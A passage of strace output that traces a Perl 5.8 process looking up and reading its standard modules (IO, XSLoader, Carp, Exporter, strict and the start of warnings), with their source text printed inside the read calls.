8423  07:23:22.814603 rt_sigaction(SIGCHLD, NULL, {SIG_DFL}, 8) = 0
8423  07:23:22.814656 readlink("/proc/self/exe", "/usr/bin/perl", 4095) = 13
8423  07:23:22.814754 getppid()         = 8421
8423  07:23:22.814830 stat64("/etc/perl/IO.pmc", 0xbfc5a9ac) = -1 ENOENT (No such file or directory)
8423  07:23:22.814845 stat64("/etc/perl/IO.pm", 0xbfc5a8bc) = -1 ENOENT (No such file or directory)
8423  07:23:22.814858 stat64("/usr/local/lib/perl/5.8.8/IO.pmc", 0xbfc5a9ac) = -1 ENOENT (No such file or directory)
8423  07:23:22.814871 stat64("/usr/local/lib/perl/5.8.8/IO.pm", 0xbfc5a8bc) = -1 ENOENT (No such file or directory)
8423  07:23:22.814884 stat64("/usr/local/share/perl/5.8.8/IO.pmc", 0xbfc5a9ac) = -1 ENOENT (No such file or directory)
8423  07:23:22.814897 stat64("/usr/local/share/perl/5.8.8/IO.pm", 0xbfc5a8bc) = -1 ENOENT (No such file or directory)
8423  07:23:22.814910 stat64("/usr/lib/perl5/IO.pmc", 0xbfc5a9ac) = -1 ENOENT (No such file or directory)
8423  07:23:22.814922 stat64("/usr/lib/perl5/IO.pm", 0xbfc5a8bc) = -1 ENOENT (No such file or directory)
8423  07:23:22.814936 stat64("/usr/share/perl5/IO.pmc", 0xbfc5a9ac) = -1 ENOENT (No such file or directory)
8423  07:23:22.814948 stat64("/usr/share/perl5/IO.pm", 0xbfc5a8bc) = -1 ENOENT (No such file or directory)
8423  07:23:22.814961 stat64("/usr/lib/perl/5.8/IO.pmc", 0xbfc5a9ac) = -1 ENOENT (No such file or directory)
8423  07:23:22.814974 stat64("/usr/lib/perl/5.8/IO.pm", {st_mode=S_IFREG|0644, st_size=413, ...}) = 0
8423  07:23:22.814995 open("/usr/lib/perl/5.8/IO.pm", O_RDONLY|O_LARGEFILE) = 6
8423  07:23:22.815009 ioctl(6, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfc5a6c8) = -1 ENOTTY (Inappropriate ioctl for device)
8423  07:23:22.815020 _llseek(6, 0, [0], SEEK_CUR) = 0
8423  07:23:22.815044 read(6, "#\n\npackage IO;\n\nuse XSLoader ();\nuse Carp;\nuse strict;\nuse warnings;\n\nour $VERSION = \"1.22\";\nXSLoader::load \'IO\', $VERSION;\n\nsub import {\n    shift;\n\n    warnings::warnif(\'deprecated\', qq{Parameterless \"use IO\" deprecated})\n        if @_ == 0 ;\n    \n    my @l = @_ ? @_ : qw(Handle Seekable File Pipe Socket Dir);\n\n    eval join(\"\", map { \"require IO::\" . (/(\\w+)/)[0] . \";\\n\" } @l)\n\tor croak $@;\n}\n\n1;\n\n__END__\n\n", 4096) = 413
8423  07:23:22.815101 stat64("/etc/perl/XSLoader.pmc", 0xbfc5a4fc) = -1 ENOENT (No such file or directory)
8423  07:23:22.815118 stat64("/etc/perl/XSLoader.pm", 0xbfc5a40c) = -1 ENOENT (No such file or directory)
8423  07:23:22.815132 stat64("/usr/local/lib/perl/5.8.8/XSLoader.pmc", 0xbfc5a4fc) = -1 ENOENT (No such file or directory)
8423  07:23:22.815144 stat64("/usr/local/lib/perl/5.8.8/XSLoader.pm", 0xbfc5a40c) = -1 ENOENT (No such file or directory)
8423  07:23:22.815170 stat64("/usr/local/share/perl/5.8.8/XSLoader.pmc", 0xbfc5a4fc) = -1 ENOENT (No such file or directory)
8423  07:23:22.815218 stat64("/usr/local/share/perl/5.8.8/XSLoader.pm", 0xbfc5a40c) = -1 ENOENT (No such file or directory)
8423  07:23:22.815253 stat64("/usr/lib/perl5/XSLoader.pmc", 0xbfc5a4fc) = -1 ENOENT (No such file or directory)
8423  07:23:22.815270 stat64("/usr/lib/perl5/XSLoader.pm", 0xbfc5a40c) = -1 ENOENT (No such file or directory)
8423  07:23:22.815288 stat64("/usr/share/perl5/XSLoader.pmc", 0xbfc5a4fc) = -1 ENOENT (No such file or directory)
8423  07:23:22.815306 stat64("/usr/share/perl5/XSLoader.pm", 0xbfc5a40c) = -1 ENOENT (No such file or directory)
8423  07:23:22.815324 stat64("/usr/lib/perl/5.8/XSLoader.pmc", 0xbfc5a4fc) = -1 ENOENT (No such file or directory)
8423  07:23:22.815342 stat64("/usr/lib/perl/5.8/XSLoader.pm", {st_mode=S_IFREG|0644, st_size=3408, ...}) = 0
8423  07:23:22.815372 open("/usr/lib/perl/5.8/XSLoader.pm", O_RDONLY|O_LARGEFILE) = 8
8423  07:23:22.815391 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfc5a218) = -1 ENOTTY (Inappropriate ioctl for device)
8423  07:23:22.815406 _llseek(8, 0, [0], SEEK_CUR) = 0
8423  07:23:22.815432 read(8, "# Generated from XSLoader.pm.PL (resolved %Config::Config value)\n\npackage XSLoader;\n\n$VERSION = \"0.06\";\n\n#use strict;\n\n# enable debug/trace messages from DynaLoader perl code\n# $dl_debug = $ENV{PERL_DL_DEBUG} || 0 unless defined $dl_debug;\n\n  my $dl_dlext = \'so\';\n\npackage DynaLoader;\n\n# No prizes for guessing why we don\'t say \'bootstrap DynaLoader;\' here.\n# NOTE: All dl_*.xs (including dl_none.xs) define a dl_error() XSUB\nboot_DynaLoader(\'DynaLoader\') if defined(&boot_DynaLoader) &&\n                                !defined(&dl_error);\npackage XSLoader;\n\nsub load {\n    package DynaLoader;\n\n    die q{XSLoader::load(\'Your::Module\', $Your::Module::VERSION)} unless @_;\n\n    my($module) = $_[0];\n\n    # work with static linking too\n    my $b = \"$module\\::bootstrap\";\n    goto &$b if defined &$b;\n\n    goto retry unless $module and defined &dl_load_file;\n\n    my @modparts = split(/::/,$module);\n    my $modfname = $modparts[-1];\n\n    my $modpname = join(\'/\',@modparts);\n    my $modlibname = (caller())[1];\n    my $c = @modparts;\n    $modlibname =~ s,[\\\\/][^\\\\/]+$,, while $c--;\t# Q&D basename\n    my $file = \"$modlibname/auto/$modpname/$modfname.$dl_dlext\";\n\n#   print STDERR \"XSLoader::load for $module ($file)\\n\" if $dl_debug;\n\n    my $bs = $file;\n    $bs =~ s/(\\.\\w+)?(;\\d*)?$/\\.bs/; # look for .bs \'beside\' the library\n\n    goto retry if not -f $file or -s $bs;\n\n    my $bootname = \"boot_$module\";\n    $bootname =~ s/\\W/_/g;\n    @DynaLoader::dl_require_symbols = ($bootname);\n\n    my $boot_symbol_ref;\n\n    if ($^O eq \'darwin\') {\n        if ($boot_symbol_ref = dl_find_symbol(0, $bootname)) {\n            goto boot; #extension library has already been loaded, e.g. darwin\n        }\n    }\n\n    # Many dynamic extension loading problems will appear to come from\n    # this section of code: XYZ failed at line 123 of DynaLoader.pm.\n    # Often these errors are actually occurring in the initialisation\n    # C code of the extension XS file. Perl reports the error as being\n    # in this perl code simply because this was the last perl code\n    # it executed.\n\n    my $libref = dl_load_file($file, 0) or do { \n        require Carp;\n        Carp::croak(\"Can\'t load \'$file\' for module $module: \" . dl_error());\n    };\n    push(@DynaLoader::dl_librefs,$libref);  # record loaded object\n\n    my @unresolved = dl_undef_symbols();\n    if (@unresolved) {\n        require Carp;\n        Carp::carp(\"Undefined symbols present after loading $file: @unresolved\\n\");\n    }\n\n    $boot_symbol_ref = dl_find_symbol($libref, $bootname) or do {\n        require Carp;\n        Carp::croak(\"Can\'t find \'$bootname\' symbol in $file\\n\");\n    };\n\n    push(@DynaLoader::dl_modules, $module); # record loaded module\n\n  boot:\n    my $xs = dl_install_xsub(\"${module}::bootstrap\", $boot_symbol_ref, $file);\n\n    # See comment block above\n    return &$xs(@_);\n\n  retry:\n    my $bootstrap_inherit = DynaLoader->can(\'bootstrap_inherit\') || \n                            XSLoader->can(\'bootstrap_inherit\');\n    goto &$bootstrap_inherit;\n}\n\n# Versions of DynaLoader prior to 5.6.0 don\'t have this function.\nsub bootstrap_inherit {\n    package DynaLoader;\n\n    my $module = $_[0];\n    local *DynaLoader::isa = *{\"$module\\::ISA\"};\n    local @DynaLoader::isa = (@DynaLoader::isa, \'DynaLoader\');\n    # Cannot goto due to delocalization.  Will report errors on a wrong line?\n    require DynaLoader;\n    DynaLoader::bootstrap(@_);\n}\n\n1;\n\n__END__\n\n", 4096) = 3408
8423  07:23:22.815851 brk(0x8195000)    = 0x8195000
8423  07:23:22.816228 _llseek(8, 3407, [3407], SEEK_SET) = 0
8423  07:23:22.816248 _llseek(8, 0, [3407], SEEK_CUR) = 0
8423  07:23:22.816259 close(8)          = 0
8423  07:23:22.816307 stat64("/etc/perl/Carp.pmc", 0xbfc5a4fc) = -1 ENOENT (No such file or directory)
8423  07:23:22.816323 stat64("/etc/perl/Carp.pm", 0xbfc5a40c) = -1 ENOENT (No such file or directory)
8423  07:23:22.816350 stat64("/usr/local/lib/perl/5.8.8/Carp.pmc", 0xbfc5a4fc) = -1 ENOENT (No such file or directory)
8423  07:23:22.816363 stat64("/usr/local/lib/perl/5.8.8/Carp.pm", 0xbfc5a40c) = -1 ENOENT (No such file or directory)
8423  07:23:22.816377 stat64("/usr/local/share/perl/5.8.8/Carp.pmc", 0xbfc5a4fc) = -1 ENOENT (No such file or directory)
8423  07:23:22.816390 stat64("/usr/local/share/perl/5.8.8/Carp.pm", 0xbfc5a40c) = -1 ENOENT (No such file or directory)
8423  07:23:22.816404 stat64("/usr/lib/perl5/Carp.pmc", 0xbfc5a4fc) = -1 ENOENT (No such file or directory)
8423  07:23:22.816415 stat64("/usr/lib/perl5/Carp.pm", 0xbfc5a40c) = -1 ENOENT (No such file or directory)
8423  07:23:22.816429 stat64("/usr/share/perl5/Carp.pmc", 0xbfc5a4fc) = -1 ENOENT (No such file or directory)
8423  07:23:22.816441 stat64("/usr/share/perl5/Carp.pm", 0xbfc5a40c) = -1 ENOENT (No such file or directory)
8423  07:23:22.816454 stat64("/usr/lib/perl/5.8/Carp.pmc", 0xbfc5a4fc) = -1 ENOENT (No such file or directory)
8423  07:23:22.816466 stat64("/usr/lib/perl/5.8/Carp.pm", 0xbfc5a40c) = -1 ENOENT (No such file or directory)
8423  07:23:22.816480 stat64("/usr/share/perl/5.8/Carp.pmc", 0xbfc5a4fc) = -1 ENOENT (No such file or directory)
8423  07:23:22.816493 stat64("/usr/share/perl/5.8/Carp.pm", {st_mode=S_IFREG|0644, st_size=4112, ...}) = 0
8423  07:23:22.816514 open("/usr/share/perl/5.8/Carp.pm", O_RDONLY|O_LARGEFILE) = 8
8423  07:23:22.816528 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfc5a218) = -1 ENOTTY (Inappropriate ioctl for device)
8423  07:23:22.816540 _llseek(8, 0, [0], SEEK_CUR) = 0
8423  07:23:22.816558 read(8, "package Carp;\n\nour $VERSION = \'1.04\';\n\n# This package is heavily used. Be small. Be fast. Be good.\n\n# Comments added by Andy Wardley <abw@kfs.org> 09-Apr-98, based on an\n# _almost_ complete understanding of the package.  Corrections and\n# comments are welcome.\n\n# The members of %Internal are packages that are internal to perl.\n# Carp will not report errors from within these packages if it\n# can.  The members of %CarpInternal are internal to Perl\'s warning\n# system.  Carp will not report errors from within these packages\n# either, and will not report calls *to* these packages for carp and\n# croak.  They replace $CarpLevel, which is deprecated.    The\n# $Max(EvalLen|(Arg(Len|Nums)) variables are used to specify how the eval\n# text and function arguments should be formatted when printed.\n\n# Comments added by Jos I. Boumans <kane@dwim.org> 11-Aug-2004\n# I can not get %CarpInternal or %Internal to work as advertised,\n# therefor leaving it out of the below documentation.\n# $CarpLevel may be decprecated according to the last comment, but\n# after 6 years, it\'s still around and in heavy use ;)\n\n$CarpInternal{Carp}++;\n$CarpInternal{warnings}++;\n$CarpLevel = 0;     # How many extra package levels to skip on carp.\n                    # How many calls to skip on confess.\n                    # Reconciling these notions is hard, use\n                    # %Internal and %CarpInternal instead.\n$MaxEvalLen = 0;    # How much eval \'...text...\' to show. 0 = all.\n$MaxArgLen = 64;    # How much of each argument to print. 0 = all.\n$MaxArgNums = 8;    # How many arguments to print. 0 = all.\n$Verbose = 0;       # If true then make shortmess call longmess instead\n\nrequire Exporter;\n@ISA = (\'Exporter\');\n@EXPORT = qw(confess croak carp);\n@EXPORT_OK = qw(cluck verbose longmess shortmess);\n@EXPORT_FAIL = qw(verbose);\t# hook to enable verbose mode\n\n# if the caller specifies verbose usage (\"perl -MCarp=verbose script.pl\")\n# then the following method will be called by the Exporter which knows\n# to do this thanks to @EXPORT_FAIL, above.  $_[1] will contain the word\n# \'verbose\'.\n\nsub export_fail {\n    shift;\n    $Verbose = shift if $_[0] eq \'verbose\';\n    return @_;\n}\n\n# longmess() crawls all the way up the stack reporting on all the function\n# calls made.  The error string, $error, is originally constructed from the\n# arguments passed into longmess() via confess(), cluck() or shortmess().\n# This gets appended with the stack trace messages which are generated for\n# each function call on the stack.\n\nsub longmess {\n    {\n\tlocal($@, $!);\n\t# XXX fix require to not clear $@ or $!?\n\t# don\'t use require unless we need to (for Safe compartments)\n\trequire Carp::Heavy unless $INC{\"Carp/Heavy.pm\"};\n    }\n    # Icky backwards compatibility wrapper. :-(\n    my $call_pack = caller();\n    if ($Internal{$call_pack} or $CarpInternal{$call_pack}) {\n      return longmess_heavy(@_);\n    }\n    else {\n      local $CarpLevel = $CarpLevel + 1;\n      return longmess_heavy(@_);\n    }\n}\n\n# shortmess() is called by carp() and croak() to skip all the way up to\n# the top-level caller\'s package and report the error from there.  confess()\n# and cluck() generate a full stack trace so they call longmess() to\n# generate that.  In verbose mode shortmess() calls longmess() so\n# you always get a stack trace\n\nsub shortmess {\t# Short-circuit &longmess if called via multiple packages\n    {\n\tlocal($@, $!);\n\t# XXX fix require to not clear $@ or $!?\n\t# don\'t use require unless we need to (for Safe compartments)\n\trequire Carp::Heavy unless $INC{\"Carp/Heavy.pm\"};\n    }\n    # Icky backwards compatibility wrapper. :-(\n    my $call_pack = caller();\n    local @CARP_NOT = caller();\n    shortmess_heavy(@_);\n}\n\n# the following four functions call longmess() or shortmess() depending on\n# whether they should generate a full stack trace (confess() and cluck())\n# or simply report the caller\'s package (croak() and carp()), respectively.\n# confess() and croak() die, carp() and cluck() warn.\n\nsub croak   { die  shortmess @_ }\nsub confess { die  longmess  @_ }\nsub carp    { warn shortmess @_ }\nsub cluck   { warn lon", 4096) = 4096
8423  07:23:22.817059 read(8, "gmess  @_ }\n\n1;\n", 4096) = 16
8423  07:23:22.817088 read(8, "", 4096) = 0
8423  07:23:22.817100 close(8)          = 0
8423  07:23:22.817121 stat64("/etc/perl/Exporter.pmc", 0xbfc5a4fc) = -1 ENOENT (No such file or directory)
8423  07:23:22.817135 stat64("/etc/perl/Exporter.pm", 0xbfc5a40c) = -1 ENOENT (No such file or directory)
8423  07:23:22.817161 stat64("/usr/local/lib/perl/5.8.8/Exporter.pmc", 0xbfc5a4fc) = -1 ENOENT (No such file or directory)
8423  07:23:22.817204 stat64("/usr/local/lib/perl/5.8.8/Exporter.pm", 0xbfc5a40c) = -1 ENOENT (No such file or directory)
8423  07:23:22.817219 stat64("/usr/local/share/perl/5.8.8/Exporter.pmc", 0xbfc5a4fc) = -1 ENOENT (No such file or directory)
8423  07:23:22.817251 stat64("/usr/local/share/perl/5.8.8/Exporter.pm", 0xbfc5a40c) = -1 ENOENT (No such file or directory)
8423  07:23:22.817266 stat64("/usr/lib/perl5/Exporter.pmc", 0xbfc5a4fc) = -1 ENOENT (No such file or directory)
8423  07:23:22.817278 stat64("/usr/lib/perl5/Exporter.pm", 0xbfc5a40c) = -1 ENOENT (No such file or directory)
8423  07:23:22.817291 stat64("/usr/share/perl5/Exporter.pmc", 0xbfc5a4fc) = -1 ENOENT (No such file or directory)
8423  07:23:22.817303 stat64("/usr/share/perl5/Exporter.pm", 0xbfc5a40c) = -1 ENOENT (No such file or directory)
8423  07:23:22.817317 stat64("/usr/lib/perl/5.8/Exporter.pmc", 0xbfc5a4fc) = -1 ENOENT (No such file or directory)
8423  07:23:22.817330 stat64("/usr/lib/perl/5.8/Exporter.pm", 0xbfc5a40c) = -1 ENOENT (No such file or directory)
8423  07:23:22.817343 stat64("/usr/share/perl/5.8/Exporter.pmc", 0xbfc5a4fc) = -1 ENOENT (No such file or directory)
8423  07:23:22.817356 stat64("/usr/share/perl/5.8/Exporter.pm", {st_mode=S_IFREG|0644, st_size=2218, ...}) = 0
8423  07:23:22.817377 open("/usr/share/perl/5.8/Exporter.pm", O_RDONLY|O_LARGEFILE) = 8
8423  07:23:22.817392 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfc5a218) = -1 ENOTTY (Inappropriate ioctl for device)
8423  07:23:22.817404 _llseek(8, 0, [0], SEEK_CUR) = 0
8423  07:23:22.817421 read(8, "package Exporter;\n\nrequire 5.006;\n\n# Be lean.\n#use strict;\n#no strict \'refs\';\n\nour $Debug = 0;\nour $ExportLevel = 0;\nour $Verbose ||= 0;\nour $VERSION = \'5.58\';\nour (%Cache);\n$Carp::Internal{Exporter} = 1;\n\nsub as_heavy {\n  require Exporter::Heavy;\n  # Unfortunately, this does not work if the caller is aliased as *name = \\&foo\n  # Thus the need to create a lot of identical subroutines\n  my $c = (caller(1))[3];\n  $c =~ s/.*:://;\n  \\&{\"Exporter::Heavy::heavy_$c\"};\n}\n\nsub export {\n  goto &{as_heavy()};\n}\n\nsub import {\n  my $pkg = shift;\n  my $callpkg = caller($ExportLevel);\n\n  if ($pkg eq \"Exporter\" and @_ and $_[0] eq \"import\") {\n    *{$callpkg.\"::import\"} = \\&import;\n    return;\n  }\n\n  # We *need* to treat @{\"$pkg\\::EXPORT_FAIL\"} since Carp uses it :-(\n  my($exports, $fail) = (\\@{\"$pkg\\::EXPORT\"}, \\@{\"$pkg\\::EXPORT_FAIL\"});\n  return export $pkg, $callpkg, @_\n    if $Verbose or $Debug or @$fail > 1;\n  my $export_cache = ($Cache{$pkg} ||= {});\n  my $args = @_ or @_ = @$exports;\n\n  local $_;\n  if ($args and not %$export_cache) {\n    s/^&//, $export_cache->{$_} = 1\n      foreach (@$exports, @{\"$pkg\\::EXPORT_OK\"});\n  }\n  my $heavy;\n  # Try very hard not to use {} and hence have to  enter scope on the foreach\n  # We bomb out of the loop with last as soon as heavy is set.\n  if ($args or $fail) {\n    ($heavy = (/\\W/ or $args and not exists $export_cache->{$_}\n               or @$fail and $_ eq $fail->[0])) and last\n                 foreach (@_);\n  } else {\n    ($heavy = /\\W/) and last\n      foreach (@_);\n  }\n  return export $pkg, $callpkg, ($args ? @_ : ()) if $heavy;\n  local $SIG{__WARN__} = \n\tsub {require Carp; &Carp::carp};\n  # shortcut for the common case of no type character\n  *{\"$callpkg\\::$_\"} = \\&{\"$pkg\\::$_\"} foreach @_;\n}\n\n# Default methods\n\nsub export_fail {\n    my $self = shift;\n    @_;\n}\n\n# Unfortunately, caller(1)[3] \"does not work\" if the caller is aliased as\n# *name = \\&foo.  Thus the need to create a lot of identical subroutines\n# Otherwise we could have aliased them to export().\n\nsub export_to_level {\n  goto &{as_heavy()};\n}\n\nsub export_tags {\n  goto &{as_heavy()};\n}\n\nsub export_ok_tags {\n  goto &{as_heavy()};\n}\n\nsub require_version {\n  goto &{as_heavy()};\n}\n\n1;\n__END__\n\n", 4096) = 2218
8423  07:23:22.818033 _llseek(8, 2217, [2217], SEEK_SET) = 0
8423  07:23:22.818051 _llseek(8, 0, [2217], SEEK_CUR) = 0
8423  07:23:22.818062 close(8)          = 0
8423  07:23:22.818136 stat64("/etc/perl/strict.pmc", 0xbfc5a4fc) = -1 ENOENT (No such file or directory)
8423  07:23:22.818153 stat64("/etc/perl/strict.pm", 0xbfc5a40c) = -1 ENOENT (No such file or directory)
8423  07:23:22.818167 stat64("/usr/local/lib/perl/5.8.8/strict.pmc", 0xbfc5a4fc) = -1 ENOENT (No such file or directory)
8423  07:23:22.818183 stat64("/usr/local/lib/perl/5.8.8/strict.pm", 0xbfc5a40c) = -1 ENOENT (No such file or directory)
8423  07:23:22.818198 stat64("/usr/local/share/perl/5.8.8/strict.pmc", 0xbfc5a4fc) = -1 ENOENT (No such file or directory)
8423  07:23:22.818210 stat64("/usr/local/share/perl/5.8.8/strict.pm", 0xbfc5a40c) = -1 ENOENT (No such file or directory)
8423  07:23:22.818236 stat64("/usr/lib/perl5/strict.pmc", 0xbfc5a4fc) = -1 ENOENT (No such file or directory)
8423  07:23:22.818277 stat64("/usr/lib/perl5/strict.pm", 0xbfc5a40c) = -1 ENOENT (No such file or directory)
8423  07:23:22.818306 stat64("/usr/share/perl5/strict.pmc", 0xbfc5a4fc) = -1 ENOENT (No such file or directory)
8423  07:23:22.818319 stat64("/usr/share/perl5/strict.pm", 0xbfc5a40c) = -1 ENOENT (No such file or directory)
8423  07:23:22.818332 stat64("/usr/lib/perl/5.8/strict.pmc", 0xbfc5a4fc) = -1 ENOENT (No such file or directory)
8423  07:23:22.818346 stat64("/usr/lib/perl/5.8/strict.pm", 0xbfc5a40c) = -1 ENOENT (No such file or directory)
8423  07:23:22.818359 stat64("/usr/share/perl/5.8/strict.pmc", 0xbfc5a4fc) = -1 ENOENT (No such file or directory)
8423  07:23:22.818372 stat64("/usr/share/perl/5.8/strict.pm", {st_mode=S_IFREG|0644, st_size=599, ...}) = 0
8423  07:23:22.818394 open("/usr/share/perl/5.8/strict.pm", O_RDONLY|O_LARGEFILE) = 8
8423  07:23:22.818410 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfc5a218) = -1 ENOTTY (Inappropriate ioctl for device)
8423  07:23:22.818435 _llseek(8, 0, [0], SEEK_CUR) = 0
8423  07:23:22.818454 read(8, "package strict;\n\n$strict::VERSION = \"1.03\";\n\nmy %bitmask = (\nrefs => 0x00000002,\nsubs => 0x00000200,\nvars => 0x00000400\n);\n\nsub bits {\n    my $bits = 0;\n    my @wrong;\n    foreach my $s (@_) {\n\tpush @wrong, $s unless exists $bitmask{$s};\n        $bits |= $bitmask{$s} || 0;\n    }\n    if (@wrong) {\n        require Carp;\n        Carp::croak(\"Unknown \'strict\' tag(s) \'@wrong\'\");\n    }\n    $bits;\n}\n\nmy $default_bits = bits(qw(refs subs vars));\n\nsub import {\n    shift;\n    $^H |= @_ ? bits(@_) : $default_bits;\n}\n\nsub unimport {\n    shift;\n    $^H &= ~ (@_ ? bits(@_) : $default_bits);\n}\n\n1;\n__END__\n\n", 4096) = 599
8423  07:23:22.818596 _llseek(8, 598, [598], SEEK_SET) = 0
8423  07:23:22.818611 _llseek(8, 0, [598], SEEK_CUR) = 0
8423  07:23:22.818622 close(8)          = 0
8423  07:23:22.818660 stat64("/etc/perl/warnings.pmc", 0xbfc5a4fc) = -1 ENOENT (No such file or directory)
8423  07:23:22.818675 stat64("/etc/perl/warnings.pm", 0xbfc5a40c) = -1 ENOENT (No such file or directory)
8423  07:23:22.818689 stat64("/usr/local/lib/perl/5.8.8/warnings.pmc", 0xbfc5a4fc) = -1 ENOENT (No such file or directory)
8423  07:23:22.818701 stat64("/usr/local/lib/perl/5.8.8/warnings.pm", 0xbfc5a40c) = -1 ENOENT (No such file or directory)
8423  07:23:22.818716 stat64("/usr/local/share/perl/5.8.8/warnings.pmc", 0xbfc5a4fc) = -1 ENOENT (No such file or directory)
8423  07:23:22.818763 stat64("/usr/local/share/perl/5.8.8/warnings.pm", 0xbfc5a40c) = -1 ENOENT (No such file or directory)
8423  07:23:22.818779 stat64("/usr/lib/perl5/warnings.pmc", 0xbfc5a4fc) = -1 ENOENT (No such file or directory)
8423  07:23:22.818808 stat64("/usr/lib/perl5/warnings.pm", 0xbfc5a40c) = -1 ENOENT (No such file or directory)
8423  07:23:22.818821 stat64("/usr/share/perl5/warnings.pmc", 0xbfc5a4fc) = -1 ENOENT (No such file or directory)
8423  07:23:22.818833 stat64("/usr/share/perl5/warnings.pm", 0xbfc5a40c) = -1 ENOENT (No such file or directory)
8423  07:23:22.818847 stat64("/usr/lib/perl/5.8/warnings.pmc", 0xbfc5a4fc) = -1 ENOENT (No such file or directory)
8423  07:23:22.818859 stat64("/usr/lib/perl/5.8/warnings.pm", 0xbfc5a40c) = -1 ENOENT (No such file or directory)
8423  07:23:22.818873 stat64("/usr/share/perl/5.8/warnings.pmc", 0xbfc5a4fc) = -1 ENOENT (No such file or directory)
8423  07:23:22.818885 stat64("/usr/share/perl/5.8/warnings.pm", {st_mode=S_IFREG|0644, st_size=13018, ...}) = 0
8423  07:23:22.818913 open("/usr/share/perl/5.8/warnings.pm", O_RDONLY|O_LARGEFILE) = 8
8423  07:23:22.818928 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfc5a218) = -1 ENOTTY (Inappropriate ioctl for device)
8423  07:23:22.818939 _llseek(8, 0, [0], SEEK_CUR) = 0
8423  07:23:22.818958 read(8, "# -*- buffer-read-only: t -*-\n# !!!!!!!   DO NOT EDIT THIS FILE   !!!!!!!\n# This file was created by warnings.pl\n# Any changes made here will be lost.\n#\n\npackage warnings;\n\nour $VERSION = \'1.05\';\n\nuse Carp ();\n\nour %Offsets = (\n\n    # Warnings Categories added in Perl 5.008\n\n    \'all\'\t\t=> 0,\n    \'closure\'\t\t=> 2,\n    \'deprecated\'\t=> 4,\n    \'exiting\'\t\t=> 6,\n    \'glob\'\t\t=> 8,\n    \'io\'\t\t=> 10,\n    \'closed\'\t\t=> 12,\n    \'exec\'\t\t=> 14,\n    \'layer\'\t\t=> 16,\n    \'newline\'\t\t=> 18,\n    \'pipe\'\t\t=> 20,\n    \'unopened\'\t\t=> 22,\n    \'misc\'\t\t=> 24,\n    \'numeric\'\t\t=> 26,\n    \'once\'\t\t=> 28,\n    \'overflow\'\t\t=> 30,\n    \'pack\'\t\t=> 32,\n    \'portable\'\t\t=> 34,\n    \'recursion\'\t\t=> 36,\n    \'redefine\'\t\t=> 38,\n    \'regexp\'\t\t=> 40,\n    \'severe\'\t\t=> 42,\n    \'debugging\'\t\t=> 44,\n    \'inplace\'\t\t=> 46,\n    \'internal\'\t\t=> 48,\n    \'malloc\'\t\t=> 50,\n    \'signal\'\t\t=> 52,\n    \'substr\'\t\t=> 54,\n    \'syntax\'\t\t=> 56,\n    \'ambiguous\'\t\t=> 58,\n    \'bareword\'\t\t=> 60,\n    \'digit\'\t\t=> 62,\n    \'parenthesis\'\t=> 64,\n    \'precedence\'\t=> 66,\n    \'printf\'\t\t=> 68,\n    \'prototype\'\t\t=> 70,\n    \'qw\'\t\t=> 72,\n    \'reserved\'\t\t=> 74,\n    \'semicolon\'\t\t=> 76,\n    \'taint\'\t\t=> 78,\n    \'threads\'\t\t=> 80,\n    \'uninitialized\'\t=> 82,\n    \'unpack\'\t\t=> 84,\n    \'untie\'\t\t=> 86,\n    \'utf8\'\t\t=> 88,\n    \'void\'\t\t=> 90,\n    \'y2k\'\t\t=> 92,\n  );\n\nour %Bits = (\n    \'all\'\t\t=> \"\\x55\\x55\\x55\\x55\\x55\\x55\\x55\\x55\\x55\\x55\\x55\\x15\", # [0..46]\n    \'ambiguous\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x04\\x00\\x00\\x00\\x00\", # [29]\n    \'bareword\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x10\\x00\\x00\\x00\\x00\", # [30]\n    \'closed\'\t\t=> \"\\x00\\x10\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [6]\n    \'closure\'\t\t=> \"\\x04\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [1]\n    \'debugging\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x10\\x00\\x00\\x00\\x00\\x00\\x00\", # [22]\n    \'deprecated\'\t=> \"\\x10\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [2]\n    \'digit\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x40\\x00\\x00\\x00\\x00\", # [31]\n    \'exec\'\t\t=> \"\\x00\\x40\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [7]\n    \'exiting\'\t\t=> \"\\x40\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [3]\n    \'glob\'\t\t=> \"\\x00\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [4]\n    \'inplace\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x40\\x00\\x00\\x00\\x00\\x00\\x00\", # [23]\n    \'internal\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x01\\x00\\x00\\x00\\x00\\x00\", # [24]\n    \'io\'\t\t=> \"\\x00\\x54\\x55\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [5..11]\n    \'layer\'\t\t=> \"\\x00\\x00\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [8]\n    \'malloc\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x04\\x00\\x00\\x00\\x00\\x00\", # [25]\n    \'misc\'\t\t=> \"\\x00\\x00\\x00\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [12]\n    \'newline\'\t\t=> \"\\x00\\x00\\x04\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [9]\n    \'numeric\'\t\t=> \"\\x00\\x00\\x00\\x04\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [13]\n    \'once\'\t\t=> \"\\x00\\x00\\x00\\x10\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [14]\n    \'overflow\'\t\t=> \"\\x00\\x00\\x00\\x40\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [15]\n    